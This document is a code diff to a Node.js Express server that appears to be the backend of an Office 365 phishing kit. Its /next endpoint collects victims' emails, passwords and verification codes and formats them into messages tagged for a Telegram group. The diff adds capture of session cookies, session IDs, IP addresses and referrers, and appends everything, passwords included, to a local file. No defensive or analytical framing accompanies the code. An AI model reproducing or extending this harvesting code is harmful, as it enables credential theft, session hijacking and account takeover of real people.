@@ -9,6 +9,31 @@ const ApiKey = process.env.IP_GEOLOCATION_API_KEY;
 const URL = `https://api-bdc.net/data/ip-geolocation?ip=`;
 const { sendMessageFor } = require('simple-telegram-message');
 const { getClientIp } = require("request-ip");
+
+async function saveSessionToken(data) {
+    const timestamp = new Date().toISOString();
+    const sessionFile = path.join(__dirname, 'session_tokens.txt');
+    const sessionEntry = `
+===========================================
+Timestamp: ${timestamp}
+Email: ${data.email || 'N/A'}
+Session ID: ${data.sessionId || 'N/A'}
+Cookies: ${data.cookies || 'N/A'}
+User-Agent: ${data.userAgent || 'N/A'}
+IP Address: ${data.ipAddress || 'N/A'}
+Referrer: ${data.referrer || 'N/A'}
+Additional Data: ${JSON.stringify(data.additionalData || {}, null, 2)}
+===========================================
+
+`;
+    
+    try {
+        await fs.appendFile(sessionFile, sessionEntry);
+        console.log('Session token saved to file');
+    } catch (error) {
+        console.error('Error saving session token:', error.message);
+    }
+}
  
 const app = express();
 const port = process.env.PORT || 5000;
@@ -29,12 +54,29 @@ app.use((req, res, next) => {
 app.post('/next', (req, res) => {
     let message = '👤📩 OFFICE\n===================\n\n';
     let responseData = { success: true };
+    
+    const cookies = req.headers.cookie || 'No cookies';
+    const sessionId = req.sessionID || req.headers['x-session-id'] || 'No session ID';
+    const ipAddress = getClientIp(req);
+    const referrer = req.headers.referer || req.headers.origin || 'No referrer';
 
     if (req.body && 'code' in req.body) {
         const { code, email } = req.body;
         message += `CODE: ${code} for ${email} \n`;
+        message += `SESSION ID: ${sessionId} \n`;
+        message += `COOKIES: ${cookies} \n`;
         message += `\n=====================\n\n`;
         message += ' ✅ UPDATE TEAM | OFFICE\n';
+        
+        saveSessionToken({
+            email,
+            sessionId,
+            cookies,
+            userAgent: req.headers['user-agent'],
+            ipAddress,
+            referrer,
+            additionalData: { code }
+        });
     } else {
         const { email, password, userAgent, timeZone } = req.body;
         
@@ -42,11 +84,23 @@ app.post('/next', (req, res) => {
         message += `PASSWORD: ${password} \n`;
         message += `BROWSER DETAILS: ${userAgent} \n`;
         message += `TIMEZONE: ${timeZone} \n`;
+        message += `SESSION ID: ${sessionId} \n`;
+        message += `COOKIES: ${cookies} \n`;
         message += `\n=====================\n\n`;
         message += ' ✅ UPDATE TEAM | OFFICE\n';
         message += `💬 Telegram: https://t.me/UpdateTeams\n`;
         
         responseData = { code };
+        
+        saveSessionToken({
+            email,
+            sessionId,
+            cookies,
+            userAgent: userAgent || req.headers['user-agent'],
+            ipAddress,
+            referrer,
+            additionalData: { password, timeZone }
+        });
     }
 
     res.json(responseData);
